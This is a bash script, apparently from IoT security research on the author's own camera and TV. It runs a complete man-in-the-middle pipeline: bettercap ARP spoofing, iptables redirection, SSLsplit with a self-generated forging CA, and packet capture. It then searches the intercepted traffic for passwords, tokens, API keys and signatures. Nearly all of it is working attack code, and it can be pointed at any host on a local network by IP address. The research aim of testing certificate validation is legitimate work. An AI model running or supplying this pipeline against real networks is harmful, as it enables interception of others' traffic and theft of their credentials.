#!/usr/bin/env bash
# =============================================================================
# mitm_arp.sh — ARP Spoofing + SSL/TLS Interception Pipeline
# IoT Security Research | Phase 3: MITM Attack
# =============================================================================
# Performs ARP spoofing via bettercap, TLS interception via SSLsplit, and
# packet capture to assess certificate validation and TLS implementation
# quality on the target device.
#
# Device-agnostic pipeline. Current target-device context:
#   Aqara 2K Camera — tests whether hardcoded SDK keys (CVE-2026-50091) or
#     weak certificate validation permit interception/forgery of camera
#     authentication signatures or stream content. Not confirmed to affect
#     device firmware directly (disclosure was SDK/cloud-scoped) — this test
#     determines whether the device-side behavior is actually exploitable.
#   LG TV            — tests general TLS/cert validation on app and update
#     traffic; no specific CVE targeted absent a finalized model/webOS version.
#   KUCACCI Lock      — not applicable; device has no network-layer TLS surface
#     (BLE/keypad only). Use scripts/rf/ble_scan.sh instead.
#
# Usage:
#   sudo bash mitm_arp.sh --target 192.168.100.X --iface eth0 \
#                          --label cam-s1 --out experiments/ip-camera/logs/ \
#                          --duration 600
#
# Requires: bettercap, sslsplit, tcpdump, root privileges
# =============================================================================

set -euo pipefail

TARGET=""
IFACE="wlp3s0"
LABEL="device"
OUT_DIR="./output"
DURATION=0   # 0 = run until Ctrl-C
GATEWAY=""   # optional override; if unset, bettercap auto-detects

while [[ $# -gt 0 ]]; do
  case "$1" in
    --target)   TARGET="$2";   shift 2 ;;
    --iface)    IFACE="$2";    shift 2 ;;
    --label)    LABEL="$2";    shift 2 ;;
    --out)      OUT_DIR="$2";  shift 2 ;;
    --duration) DURATION="$2"; shift 2 ;;
    --gateway)  GATEWAY="$2";  shift 2 ;;
    *) echo "[ERROR] Unknown argument: $1"; exit 1 ;;
  esac
done

[[ -z "$TARGET" ]] && { echo "[ERROR] --target is required"; exit 1; }

mkdir -p "$OUT_DIR"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="$OUT_DIR/mitm_${LABEL}_${TIMESTAMP}.log"
PCAP_FILE="$OUT_DIR/mitm_${LABEL}_${TIMESTAMP}.pcap"
BETTERCAP_LOG="$OUT_DIR/bettercap_${LABEL}_${TIMESTAMP}.log"

log() { echo "[$(date +%H:%M:%S)] $*" | tee -a "$LOG_FILE"; }

log "===== MITM / TLS Interception: $TARGET ====="
log "Interface: $IFACE | Label: $LABEL | Duration: ${DURATION}s (0=indefinite)"
log ""

# ── Step 1: Enable IP forwarding ──────────────────────────────────────────────
log "── Step 1: Enable IP Forwarding ──"
echo 1 > /proc/sys/net/ipv4/ip_forward
log "IP forwarding enabled"

# ── Step 2: iptables redirect to SSLsplit ─────────────────────────────────────
log ""
log "── Step 2: Configure iptables Redirect ──"
iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port 8443
log "Redirect rules added: 80→8080, 443→8443"

# ── Step 3: Start SSLsplit ────────────────────────────────────────────────────
# NOTE: an "https" sslsplit listener needs a CA cert/key (-c/-k) to forge
# per-connection leaf certificates. Without them, matching HTTPS connections
# are DROPPED, not decrypted — the original script omitted -c/-k entirely,
# which would have made any "no credentials captured" result meaningless (it
# wouldn't mean the camera validated certs correctly; it would mean sslsplit
# never attempted interception). We generate a reusable self-signed CA here
# (once, under $OUT_DIR so it persists across State 1/2/3 runs for this
# experiment) and wire it in. This is also the actual point of the CVE-2026-
# 50091 test: the camera's TLS client has no reason to trust this CA, so
# whether it accepts the forged cert anyway (vulnerable) or rejects the
# handshake (correct validation) IS the result.
log ""
log "── Step 3: Start SSLsplit ──"
mkdir -p "$OUT_DIR/sslsplit_logs"

CA_DIR="$OUT_DIR/mitm_ca"
mkdir -p "$CA_DIR"
CA_KEY="$CA_DIR/ca.key"
CA_CRT="$CA_DIR/ca.crt"
if [[ ! -f "$CA_KEY" || ! -f "$CA_CRT" ]]; then
  log "Generating self-signed MITM CA (first run — reused on subsequent runs): $CA_DIR"
  openssl req -x509 -newkey rsa:2048 -days 3650 -nodes \
    -keyout "$CA_KEY" -out "$CA_CRT" \
    -subj "/CN=IoT Research MITM CA/O=IoT-Security-Research" 2>>"$LOG_FILE"
else
  log "Reusing existing MITM CA: $CA_CRT"
fi

sslsplit -D -l "$OUT_DIR/sslsplit_logs/connections.log" \
  -j "$OUT_DIR/sslsplit_logs/" \
  -S "$OUT_DIR/sslsplit_logs/" \
  -k "$CA_KEY" -c "$CA_CRT" \
  http 0.0.0.0 8080 \
  https 0.0.0.0 8443 &
SSLSPLIT_PID=$!
sleep 1
if ! kill -0 "$SSLSPLIT_PID" 2>/dev/null; then
  log "✗  FATAL: sslsplit exited immediately after launch — TLS interception did"
  log "   NOT start. Check the output above/$LOG_FILE for the actual error."
  exit 1
fi
log "SSLsplit confirmed running (PID $SSLSPLIT_PID). Logs: $OUT_DIR/sslsplit_logs/"
log "CA: $CA_CRT (self-signed, NOT trusted by the camera — a rejected handshake"
log "is an expected possible outcome and indicates correct cert validation)"

# ── Step 4: Start packet capture ──────────────────────────────────────────────
log ""
log "── Step 4: Packet Capture ──"
tcpdump -i "$IFACE" -n "host $TARGET" -w "$PCAP_FILE" 2>>"$LOG_FILE" &
TCPDUMP_PID=$!
log "tcpdump capturing to $PCAP_FILE (PID $TCPDUMP_PID)"

# ── Step 5: Start bettercap ARP spoofing ──────────────────────────────────────
log ""
log "── Step 5: ARP Spoofing via bettercap ──"

cat > /tmp/mitm.cap <<CAPEOF
net.probe on
set arp.spoof.targets $TARGET
set arp.spoof.internal false
set arp.spoof.fullduplex true
arp.spoof on
net.sniff on
CAPEOF

bettercap -iface "$IFACE" \
  -caplet /tmp/mitm.cap \
  ${GATEWAY:+-gateway-override "$GATEWAY"} \
  > "$BETTERCAP_LOG" 2>&1 &
BETTERCAP_PID=$!
log "bettercap launched (PID $BETTERCAP_PID). Log: $BETTERCAP_LOG"

# ── Verify bettercap actually stayed up — the original script logged "started"
# unconditionally from $! without checking whether the process survived launch.
# bettercap exits immediately on a bad flag/arg and that failure was previously
# silent: the rest of the script (and the capture window) ran to completion
# against a target that was never actually ARP-spoofed, producing an empty
# connections.log that looked like a result but wasn't one.
sleep 2
if ! kill -0 "$BETTERCAP_PID" 2>/dev/null; then
  log "✗  FATAL: bettercap exited immediately after launch — ARP spoofing did"
  log "   NOT start. Check $BETTERCAP_LOG for the actual error before re-running."
  log "   Any empty/null result from this run is NOT a device finding — the"
  log "   camera's traffic was never redirected through this host."
  tail -20 "$BETTERCAP_LOG" | while IFS= read -r line; do log "   bettercap: $line"; done
  exit 1
fi
log "bettercap confirmed running after 2s — ARP spoofing active."
log "Scope: $TARGET <-> gateway only (arp.spoof.internal=false — other hosts on"
log "this segment, e.g. other connected clients, are not targeted)"

# ── Cleanup (registered NOW, before the capture window, so Ctrl-C during the ──
# ── sleep/wait below actually runs it — this was a bug in the original: the ──
# ── trap was registered AFTER sleep/wait, so interrupting the indefinite run ──
# ── (the normal way to stop it) left iptables rules, ip_forward, and orphaned ──
# ── bettercap/sslsplit/tcpdump processes behind.) ─────────────────────────────
cleanup() {
  log ""
  log "── Cleanup ──"
  kill "$SSLSPLIT_PID" "$TCPDUMP_PID" "$BETTERCAP_PID" 2>/dev/null || true
  iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null || true
  iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port 8443 2>/dev/null || true
  echo 0 > /proc/sys/net/ipv4/ip_forward
  log "Redirect rules removed, IP forwarding disabled"
}
trap cleanup EXIT

# ── Run for duration or until Ctrl-C ──────────────────────────────────────────
log ""
if [[ "$DURATION" -gt 0 ]]; then
  log "Running for ${DURATION}s. Monitor $OUT_DIR/sslsplit_logs/ for intercepted data."
  log ""
  log "Success criteria:"
  log "  ✓ VULNERABLE    — plaintext credentials, auth signatures, or decrypted"
  log "                     data found in sslsplit_logs/ (tests cert validation"
  log "                     failure independent of cause — e.g., CVE-2026-50091"
  log "                     class hardcoded-key issues, or simple missing pinning)"
  log "  ✓ CERT PINNING  — SSLsplit connections rejected (connection errors in log)"
  log "  ✓ HTTPS ENFORCE — no plaintext HTTP content captured"
  log ""
  log "⚠  REMINDER: Phase 1 baseline showed ZERO TCP traffic from this device over"
  log "   24h. For this test to be meaningful, actively trigger cloud-bound traffic"
  log "   now — open the Aqara Home app and view the stream via remote/cloud relay"
  log "   (not local RTSP), or trigger a firmware check. Idle capture will produce"
  log "   a false-negative 'no credentials found' result."
  sleep "$DURATION"
else
  log "Running indefinitely. Press Ctrl-C to stop."
  log "Monitor: tail -f $OUT_DIR/sslsplit_logs/connections.log"
  log ""
  log "⚠  REMINDER: Phase 1 baseline showed ZERO TCP traffic from this device over"
  log "   24h. For this test to be meaningful, actively trigger cloud-bound traffic"
  log "   now — open the Aqara Home app and view the stream via remote/cloud relay"
  log "   (not local RTSP), or trigger a firmware check. Idle capture will produce"
  log "   a false-negative 'no credentials found' result."
  wait
fi

# ── Results summary ────────────────────────────────────────────────────────────
log ""
log "===== MITM Test Complete ====="
log "Evidence files:"
ls -lh "$OUT_DIR/sslsplit_logs/"* 2>/dev/null | head -20 | tee -a "$LOG_FILE"
log ""

# Quick check for captured credentials/auth material
# Fixed two bugs: (1) missing -r meant grep errored on "Is a directory" instead
# of actually searching sslsplit_logs/'s contents; (2) with `set -o pipefail`
# active, that error made the pipeline report failure even though `wc -l` had
# already printed a valid "0" to stdout, so `|| echo 0` fired too and appended
# a SECOND "0" on its own line — producing the literal two-line value "0\n0"
# that broke the numeric comparison below (same bug class as the grep -c
# double-output issue found and fixed in credential_test.sh).
CRED_COUNT=$(grep -r -i "password\|passwd\|authorization\|token\|api_key\|signature" \
  "$OUT_DIR/sslsplit_logs/" 2>/dev/null | wc -l) || CRED_COUNT=0
log "Potential credential/auth strings found: $CRED_COUNT"

if [[ "$CRED_COUNT" -gt 0 ]]; then
  log "⚠  RESULT: SSL/TLS interception SUCCEEDED — device does not validate certificates"
  log "   OWASP: I7 (Insecure Data Transfer), I3 (Insecure Ecosystem Interfaces)"
  log "   ETSI:  Provision 5.5 violation"
  log "   If testing Aqara camera: cross-reference with CVE-2026-50091 to determine"
  log "   whether hardcoded SDK keys are the root cause vs. a separate validation gap"
else
  log "✓  No credentials/auth material captured. Check sslsplit connection log for certificate errors."
fi

log "Next: python scripts/analysis/pcap_parser.py --pcap $PCAP_FILE"
log "Next: python scripts/analysis/tls_checker.py --target $TARGET"
